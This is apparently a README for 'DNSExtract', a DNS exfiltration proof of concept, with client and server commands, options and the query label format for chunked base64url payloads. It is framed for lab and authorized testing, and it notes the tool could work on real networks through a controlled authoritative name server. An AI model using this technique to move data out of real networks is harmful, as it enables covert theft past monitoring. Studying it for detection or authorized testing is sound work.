# DNSExtract

DNSExtract is a small DNS exfiltration proof of concept. The client base64url
encodes a payload, splits it into DNS-safe labels, and sends one DNS query per
chunk. The server listens for those queries, reassembles each session, decodes
the payload, prints it, and returns NXDOMAIN.

This is intended for local lab use and authorized testing only.

## Local test

Install the client dependency first:

```bash
pip install scapy
```

Binding to UDP port 53 usually requires elevated permissions. For local testing,
use a high port and send the client query there:

```bash
python server.py --bind 127.0.0.1 --port 5353 --domain testing.com
```

In another terminal:

```bash
python client.py --server 127.0.0.1 --port 5353 --domain testing.com --payload "lab-host"
```

The client defaults to UDP port 53 because that is what recursive resolvers and
authoritative DNS setups expect, but `--port` is useful for local lab testing.

## Options

Client:

```bash
python client.py --server 127.0.0.1 --domain testing.com --payload "example"
```

- `--server`: DNS server IP to query. Defaults to `127.0.0.1`.
- `--port`: DNS server UDP port to query. Defaults to `53`.
- `--domain`: Domain suffix to place after the exfil labels. Defaults to
  `testing.com`.
- `--payload`: Value to exfiltrate. Defaults to the local hostname.
- `--timeout`: Seconds to wait for each DNS response. Defaults to `2`.

Server:

```bash
python server.py --bind 127.0.0.1 --port 53 --domain testing.com
```

- `--bind`: Address to bind. Defaults to `127.0.0.1`.
- `--port`: UDP port to bind. Defaults to `53`.
- `--domain`: Domain suffix to accept. Defaults to `testing.com`.

## Notes

The current format is:

```text
<session-id>.<chunk-index>.<chunk-total>.<base64url-chunk>.<domain>
```

This should work in a real setup if the configured domain resolves to a server
where you control the authoritative name server path. That still needs testing
outside the local machine.
